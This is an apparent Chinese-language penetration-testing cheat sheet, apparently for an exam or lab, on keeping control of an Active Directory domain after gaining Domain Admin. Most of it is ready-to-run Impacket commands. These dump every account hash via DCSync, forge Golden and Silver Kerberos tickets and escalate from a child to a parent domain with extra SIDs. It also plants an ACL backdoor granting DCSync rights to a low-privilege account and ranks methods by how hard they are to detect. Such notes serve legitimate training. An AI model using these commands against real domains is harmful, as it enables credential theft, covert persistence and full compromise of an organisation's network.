## 理論基礎：Domain Dominance 的意義

取得 Domain Admin 只是一個時間點。持久化讓你在：
- 密碼重設後仍能進入
- 帳號被停用後仍能進入
- 機器重啟後仍能進入

**AD 中最強的持久化是控制 krbtgt 帳號**，因為 krbtgt 的 hash 是 Golden Ticket 的基礎，而 Kerberos 的設計讓 Golden Ticket 幾乎無法在不重設 krbtgt 兩次的情況下失效。

---

## Step 1：DCSync（取得所有帳號 hash）

### 理論

DCSync 不是登入 DC 的 lsass，而是模擬一台 DC 向真實 DC 發起「複製請求」（MS-DRSR 協定），請求複製特定帳號的 NTDS 資料，包含 NT hash 和 Kerberos key。需要 Domain Admin 或 DS-Replication 權限。

```bash
# secretsdump DCSync（從 Linux，推薦）
python3 secretsdump.py DOMAIN/Administrator:PASSWORD@DC_IP -just-dc
# -just-dc       → 只做 DCSync（不 dump 遠端機器的 lsass/SAM）
#                  輸出格式：user:RID:LM_HASH:NT_HASH

# PTH 版本
python3 secretsdump.py -hashes :NT_HASH DOMAIN/Administrator@DC_IP -just-dc

# 只 dump 特定帳號
python3 secretsdump.py DOMAIN/Administrator:PASSWORD@DC_IP -just-dc-user krbtgt
python3 secretsdump.py DOMAIN/Administrator:PASSWORD@DC_IP -just-dc-user Administrator

# 輸出儲存到檔案
python3 secretsdump.py DOMAIN/Administrator:PASSWORD@DC_IP -just-dc | tee /tmp/dcsync.txt

# 找重要 hash
grep -E "^krbtgt|^Administrator|^Domain" /tmp/dcsync.txt

# WSL2 時鐘修正（DCSync 也需要 Kerberos，注意時差）
CT=$(ldapsearch -x -H ldap://DC_IP -D "USER@DOMAIN.LOCAL" -w PASS \
  -b "" -s base currentTime 2>/dev/null | grep currentTime | awk '{print $2}')
DC_TIME="${CT:0:4}-${CT:4:2}-${CT:6:2} ${CT:8:2}:${CT:10:2}:${CT:12:2}"
TZ=UTC faketime "$DC_TIME" python3 secretsdump.py DOMAIN/USER:PASS@DC_IP -just-dc
```

## Step 2：Golden Ticket（krbtgt hash 的持久化）

### 理論

Golden Ticket 是用 krbtgt 的 NT hash 偽造的 Kerberos TGT。因為 TGT 由 KDC（使用 krbtgt 的 key）簽署，而 KDC 沒有機制驗證 TGT 是否真的是它簽的（只要驗簽過就接受），所以偽造的 Golden Ticket 可以：
- 冒充任何使用者
- 包含任意群組成員（包含 Enterprise Admins）
- 有效期最多 10 年

**條件**：只需要 krbtgt 的 NT hash 和 domain SID。

```bash
# 偽造 Golden Ticket
python3 ticketer.py \
  -nthash KRBTGT_NT_HASH \
  -domain DOMAIN.LOCAL \
  -domain-sid DOMAIN_SID \
  Administrator
# -nthash     → krbtgt 的 NT hash（從 DCSync 取得）
# -domain     → 目標 domain（DNS 格式）
# -domain-sid → domain SID（S-1-5-21-...，從 secretsdump 輸出或 lookupsid 取得）
# Administrator → 偽造的使用者名稱（可以填任何名稱，即使帳號不存在）

# 使用 Golden Ticket
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@DC_FQDN
# -k      → 使用 Kerberos 認證（讀 KRB5CCNAME）
# -no-pass → 不提示密碼
# DC_FQDN → 必須用 FQDN（不能用 IP）

# 也可用於其他 Impacket 工具
python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@SERVER_FQDN
python3 smbexec.py -k -no-pass DOMAIN.LOCAL/Administrator@SERVER_FQDN

# 加入 Extra SIDs（Enterprise Admins）
python3 ticketer.py \
  -nthash KRBTGT_NT_HASH \
  -domain CHILD.DOMAIN.LOCAL \
  -domain-sid CHILD_DOMAIN_SID \
  -extra-sid PARENT_DOMAIN_SID-519 \
  Administrator
# -extra-sid → 塞入 Parent Domain Enterprise Admins SID，用於 child → parent 提權
```

## Step 3：Silver Ticket（服務帳號持久化）

### 理論

Silver Ticket 是用**服務帳號的 NT hash**（而不是 krbtgt）偽造的 TGS（服務票據）。它繞過 KDC，直接向目標服務提交偽造的 TGS。

**優點**：不需要 krbtgt hash，只需要服務帳號的 hash。偵測更難（不需要 TGT 請求，沒有 KDC 日誌）。

```bash
# 偽造 Silver Ticket（針對 CIFS 服務，用於 SMB 存取）
python3 ticketer.py \
  -nthash SERVICE_ACCOUNT_HASH \
  -domain DOMAIN.LOCAL \
  -domain-sid DOMAIN_SID \
  -spn CIFS/TARGET_SERVER.DOMAIN.LOCAL \
  Administrator
# -spn  → 目標服務的 SPN
#   CIFS → SMB 存取
#   HTTP → IIS/Web
#   MSSQLSvc → SQL Server
#   HOST → 通用，可用於多種遠端管理

# 使用 Silver Ticket
export KRB5CCNAME=Administrator.ccache
python3 smbexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET_FQDN
```

## 持久化方法對比

| 方法 | 需要什麼 | 存活條件 | 偵測難度 |
|------|---------|---------|---------|
| Golden Ticket | krbtgt hash | krbtgt 未重設兩次 | 中（TGT 生命週期異常） |
| Silver Ticket | 服務帳號 hash | 服務帳號密碼未重設 | 高（無 KDC 日誌） |
| DCSync 備份 | Domain Admin | 帳號未停用 | 中 |
| 加 DA 群組 | 修改群組成員 | 群組未被審計 | 低（易被發現） |
| ACL 後門 | WriteDACL 設定 | ACL 未被清除 | 高（難以發現） |
| Shadow Credentials | GenericAll | ADCS 未清除 KeyCredentialLink | 高 |

## ACL 後門（最隱蔽的持久化）

```bash
# 給低權帳號加 DCSync 權限（WriteDACL 後設定）
python3 dacledit.py \
  -action write \
  -rights DCSync \
  -principal BACKDOOR_USER \
  -target-dn 'DC=domain,DC=local' \
  'DOMAIN/Administrator:PASSWORD' \
  -dc-ip DC_IP
# -rights DCSync   → 加入 DS-Replication-Get-Changes 和 DS-Replication-Get-Changes-All
# -principal       → 被授予權限的帳號（後門帳號）
# -target-dn       → domain 根節點 DN

# 之後用後門帳號做 DCSync
python3 secretsdump.py DOMAIN/BACKDOOR_USER:PASS@DC_IP -just-dc
```

## 後 DA 動作清單

```
取得 Domain Admin 後，按優先順序：

1. DCSync → 取得所有 hash
   python3 secretsdump.py DOMAIN/Admin:PASS@DC_IP -just-dc

2. 找 flag 檔案（考試）
   nxc smb DC_IP -u Administrator -p PASS -x "type C:\flag.txt"

3. 存 krbtgt hash（Golden Ticket 材料）
   grep krbtgt /tmp/dcsync.txt

4. 記錄 Domain SID
   grep "S-1-5-21" /tmp/dcsync.txt | head -1

5. 需要持久化才用 Golden Ticket
   python3 ticketer.py -nthash KRBTGT_HASH -domain DOMAIN -domain-sid SID Administrator
```

## 速查表

```bash
# DCSync（最重要的第一步）
python3 secretsdump.py DOMAIN/Admin:PASS@DC_IP -just-dc | tee /tmp/dcsync.txt
grep -E "krbtgt|Administrator" /tmp/dcsync.txt

# 取得 Domain SID
python3 lookupsid.py DOMAIN/Admin:PASS@DC_IP 0
# 輸出中找 domain-sid

# Golden Ticket
python3 ticketer.py -nthash KRBTGT_HASH -domain DOMAIN.LOCAL \
  -domain-sid S-1-5-21-xxx-xxx-xxx Administrator
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@DC_FQDN

# 查 flag（常見位置）
nxc smb TARGET -u Admin -H HASH -x "dir C:\ /s /b | findstr flag"
```
